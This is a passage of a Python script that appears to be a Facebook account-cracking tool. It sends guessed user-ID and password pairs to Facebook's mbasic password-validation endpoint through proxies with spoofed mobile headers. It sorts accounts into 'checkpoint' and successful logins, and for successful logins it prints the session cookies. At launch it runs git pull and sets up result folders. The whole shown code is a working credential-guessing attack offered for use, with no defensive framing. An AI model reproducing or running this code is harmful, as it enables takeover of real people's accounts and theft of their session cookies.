			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1733613883443%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df06d60674ea79429a%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Fsignin%252Fsignup%252Fpassword%253FforceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Df49a1381a0661a850%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96388283b9069929%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%2526frame%253Df993dbfe52a625a68%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96388283b9069929%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffa9d087b96976262a%26relation%3Dopener%26frame%3Df993dbfe52a625a68%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=733768086637828&kid_directed_site=0&app_id=733768086637828&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1733613883443%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df06d60674ea79429a%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Fsignin%252Fsignup%252Fpassword%253FforceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Df49a1381a0661a850%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96388283b9069929%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%2526frame%253Df993dbfe52a625a68%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96388283b9069929%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffa9d087b96976262a%26relation%3Dopener%26frame%3Df993dbfe52a625a68%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1733613883443%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df06d60674ea79429a%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Fsignin%252Fsignup%252Fpassword%253FforceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Df49a1381a0661a850%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96388283b9069929%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%2526frame%253Df993dbfe52a625a68%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96388283b9069929%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffa9d087b96976262a%26relation%3Dopener%26frame%3Df993dbfe52a625a68%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}")
				cetak(tree)
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				cetak(tree) 
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(31)
	loop+=1
	
#system control
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/BrayennnXD')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	logindong()
